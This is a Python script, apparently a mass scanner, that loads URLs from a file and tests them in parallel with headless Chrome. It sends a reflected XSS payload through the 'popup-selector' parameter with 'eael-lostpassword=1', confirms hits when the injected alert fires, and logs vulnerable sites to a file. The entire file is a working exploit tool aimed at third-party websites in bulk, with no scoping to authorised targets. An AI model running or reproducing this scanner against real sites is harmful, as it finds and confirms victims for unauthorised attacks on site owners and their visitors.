import sys
import time
import threading
import queue
import re
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException, WebDriverException

# Lock for thread-safe file writing
file_lock = threading.Lock()
# Counter for statistics
stats = {
    'vulnerable': 0,
    'errors': 0,
    'timeouts': 0,
    'processed': 0
}
stats_lock = threading.Lock()

# Suppress excessive DevTools output
import logging
from selenium.webdriver.remote.remote_connection import LOGGER
LOGGER.setLevel(logging.WARNING)

def is_valid_url(url):
    """Check if the URL is valid and has a scheme"""
    if not url or url.isspace():
        return False
    
    # Remove any BOM characters that might be at the start
    url = url.lstrip('\ufeff')
    
    # Check if the URL starts with http:// or https://
    if not url.startswith(('http://', 'https://')):
        return False
    
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def check_xss(url):
    """Test a URL for XSS vulnerability"""
    # Skip invalid URLs
    if not is_valid_url(url):
        print(f"[INVALID URL] Skipping: {url}")
        return False
    
    # Configure Chrome options
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--ignore-ssl-errors")
    chrome_options.add_argument("--log-level=3")  # Suppress console messages
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    # Create payload URL
    payload_url = f"{url}/?popup-selector=%3Cimg_src=x_onerror=alert(%22chirgart%22)%3E&eael-lostpassword=1"
    
    # Initialize the WebDriver with webdriver-manager
    try:
        service = Service(ChromeDriverManager().install())  # Fixed: removed log_level parameter
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(8)  # Reduced timeout for faster scanning
    except Exception as e:
        print(f"[ERROR] Failed to initialize WebDriver: {str(e).split('\n')[0]}")
        return False
    
    try:
        print(f"Testing URL: {url}")
        
        # Navigate to the page
        try:
            driver.get(payload_url)
        except TimeoutException:
            with stats_lock:
                stats['timeouts'] += 1
            print(f"[TIMEOUT] Page load timed out: {url}")
            return False
        except Exception as e:
            error_msg = str(e).split('\n')[0]  # Get only the first line of the error
            print(f"[ERROR] Failed to load page: {error_msg}")
            return False
        
        # Wait for a few seconds for any JavaScript to execute
        time.sleep(1.5)  # Reduced wait time
        
        # Check if an alert is present
        try:
            WebDriverWait(driver, 2).until(EC.alert_is_present())  # Reduced wait time
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            
            if "chirgart" in alert_text:
                print(f"[VULNERABLE] XSS confirmed on {url}")
                with file_lock:
                    with open("found-vuln-fully.txt", "a") as f:
                        f.write(f"{url}\n")
                return True
        except (TimeoutException, NoAlertPresentException):
            print(f"[NOT VULNERABLE] No XSS alert detected on {url}")
            return False
        except UnexpectedAlertPresentException:
            print(f"[VULNERABLE] XSS confirmed on {url} (unexpected alert)")
            with file_lock:
                with open("found-vuln-fully.txt", "a") as f:
                    f.write(f"{url}\n")
            return True
            
    except WebDriverException as e:
        error_msg = str(e).split('\n')[0]
        print(f"[ERROR] WebDriver error: {error_msg}")
        return False
    except Exception as e:
        error_msg = str(e).split('\n')[0]
        print(f"[ERROR] Unexpected error: {error_msg}")
        return False
    finally:
        # Clean up
        try:
            driver.quit()
        except:
            pass
    
    return False

def worker(url_queue, total_urls):
    """Worker function for threads"""
    while not url_queue.empty():
        try:
            url = url_queue.get_nowait()
            
            # Skip empty URLs
            if not url or not url.strip():
                url_queue.task_done()
                continue
                
            # Sanitize URL
            url = url.strip()
            
            # Remove BOM character if present
            if url.startswith('\ufeff'):
                url = url[1:]
                
            # Remove trailing slash if present
            if url.endswith("/"):
                url = url[:-1]
            
            with stats_lock:
                stats['processed'] += 1
                current = stats['processed']
            
            print(f"[{current}/{total_urls}] Testing: {url}")
            
            try:
                is_vulnerable = check_xss(url)
                
                if is_vulnerable:
                    with stats_lock:
                        stats['vulnerable'] += 1
            except Exception as e:
                error_msg = str(e).split('\n')[0]
                print(f"[ERROR] Failed to test {url}: {error_msg}")
                with stats_lock:
                    stats['errors'] += 1
        except queue.Empty:
            break
        except Exception as e:
            error_msg = str(e).split('\n')[0]
            print(f"Worker error: {error_msg}")
        finally:
            url_queue.task_done()

if __name__ == "__main__":
    # Check if file with URLs is provided as argument
    if len(sys.argv) < 2:
        print("Usage: python check.py <url_or_file> [threads]")
        sys.exit(1)
    
    input_arg = sys.argv[1]
    
    # Get number of threads (default: 5)
    num_threads = 5
    if len(sys.argv) > 2:
        try:
            num_threads = int(sys.argv[2])
        except ValueError:
            print(f"Invalid thread count, using default: {num_threads}")
    
    # Check if the argument is a file
    if input_arg.endswith('.txt'):
        # Process URLs from file
        try:
            with open(input_arg, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
            
            # Filter out invalid URLs
            valid_urls = [url for url in urls if is_valid_url(url)]
            invalid_count = len(urls) - len(valid_urls)
            if invalid_count > 0:
                print(f"Found {invalid_count} invalid URLs that will be skipped")
            
            total_urls = len(valid_urls)
            print(f"Loaded {total_urls} valid URLs to test using {num_threads} threads")
            
            # Create work queue
            url_queue = queue.Queue()
            for url in valid_urls:
                url_queue.put(url)
            
            # Create and start worker threads
            threads = []
            for _ in range(min(num_threads, total_urls)):
                t = threading.Thread(target=worker, args=(url_queue, total_urls))
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Monitor progress
            start_time = time.time()
            try:
                while not url_queue.empty():
                    completed = stats['processed']
                    elapsed = time.time() - start_time
                    
                    if elapsed > 0 and completed > 0:
                        urls_per_second = completed / elapsed
                        remaining = total_urls - completed
                        eta_seconds = remaining / urls_per_second if urls_per_second > 0 else 0
                        
                        eta_str = ""
                        if eta_seconds > 0:
                            eta_min = int(eta_seconds / 60)
                            eta_sec = int(eta_seconds % 60)
                            eta_str = f" - ETA: {eta_min}m {eta_sec}s"
                        
                        print(f"Progress: {completed}/{total_urls} ({(completed/total_urls*100):.1f}%) - Vulnerable: {stats['vulnerable']} - Errors: {stats['errors']} - Timeouts: {stats['timeouts']}{eta_str}")
                    
                    time.sleep(5)  # Update every 5 seconds
                
                # Wait for all threads to complete
                url_queue.join()
                
            except KeyboardInterrupt:
                print("\nScan interrupted by user. Saving results...")
            
            elapsed_time = time.time() - start_time
            minutes = int(elapsed_time // 60)
            seconds = int(elapsed_time % 60)
            
            print(f"\nCompleted testing {stats['processed']}/{total_urls} URLs in {minutes}m {seconds}s")
            print(f"Found {stats['vulnerable']} vulnerable sites (saved to found-vuln-fully.txt)")
            print(f"Encountered {stats['errors']} errors and {stats['timeouts']} timeouts")
            
        except Exception as e:
            error_msg = str(e).split('\n')[0]
            print(f"Error processing file: {error_msg}")
    else:
        # Process single URL
        url = input_arg
        if url.endswith("/"):
            url = url[:-1]
        
        check_xss(url)
